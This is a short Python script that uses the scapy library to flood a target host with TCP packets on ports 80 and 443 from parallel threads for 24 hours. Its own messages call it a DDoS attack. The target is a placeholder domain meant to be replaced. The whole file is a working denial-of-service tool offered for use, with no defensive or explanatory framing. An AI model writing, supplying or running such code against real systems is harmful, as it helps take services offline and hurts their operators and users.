from scapy.all import IP, TCP, send
import time
import threading

# Target information
target_ip = "example.com"  # Replace with the target IP or domain
target_port_80 = 80
target_port_443 = 443
packet_count = 10000000  # 10 million packets
duration = 24 * 60 * 60  # 24 hours in seconds

def send_packets(target_ip, target_port, packet_count):
    for _ in range(packet_count):
        ip_layer = IP(dst=target_ip)
        tcp_layer = TCP(dport=target_port)
        packet = ip_layer / tcp_layer
        send(packet, verbose=0)

def attack(target_ip, target_port_80, target_port_443, duration):
    print(f"Starting DDoS attack on {target_ip} for {duration} seconds.")
    start_time = time.time()

    while time.time() - start_time < duration:
        thread_80 = threading.Thread(target=send_packets, args=(target_ip, target_port_80, packet_count))
        thread_443 = threading.Thread(target=send_packets, args=(target_ip, target_port_443, packet_count))
        thread_80.start()
        thread_443.start()
        thread_80.join()
        thread_443.join()

    print(f"DDoS attack on {target_ip} has completed.")

def main():
    attack(target_ip, target_port_80, target_port_443, duration)

if __name__ == "__main__":
    main()